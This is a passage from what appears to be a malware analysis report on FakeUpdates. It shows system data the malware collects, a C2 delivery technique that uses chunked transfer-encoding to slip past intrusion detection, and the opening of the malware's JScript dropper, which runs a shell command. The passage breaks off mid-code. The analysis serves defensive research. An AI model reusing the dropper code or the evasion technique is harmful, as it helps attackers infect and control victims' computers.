@@ -1,0 +1,11 @@
+
+HP EliteDesk 10=BIOS_VERSION 11=
+Windows Defender|Vendor Anti-Virus 12=
+Vendor Anti-Virus|Windows Defender| 13=00:00:00:00:00:00 14=
+Enhanced (101- or 102-key) 15=USB Input Device 16=1024x768 17=
+System Idle Process|System|smss.exe|csrss.exe|wininit.exe|csrss.exe| winlogon.exe|services.exe|lsass.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe| svchost.exe|spoolsv.exe|svchost.exe|svchost.exe|HPLaserJetService.exe|conhost.exe… Figure 6: Decoded system information gathered by the FakeUpdates malware
+After receiving the system information, the C2 server responds with an encoded payload delivered via chunked transfer-encoding to the infected system.
+This technique evades conventional IDS/IPS appliances, allowing for the second-stage payload to successfully download.
+During our investigations and FireEye Intelligence’s monitoring, we recovered encoded payloads that delivered one of the following: Dridex (Figure 7) NetSupport Manage Remote Access Tools (RATs) (Figure 8) Chthonic or AZORult (Figure 9) function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.
+Shell\"); wsh.
+Run('cmd /C rename \"' + _tempFilePathSave + '\" \"' + execFileName + '\"'); WScript.
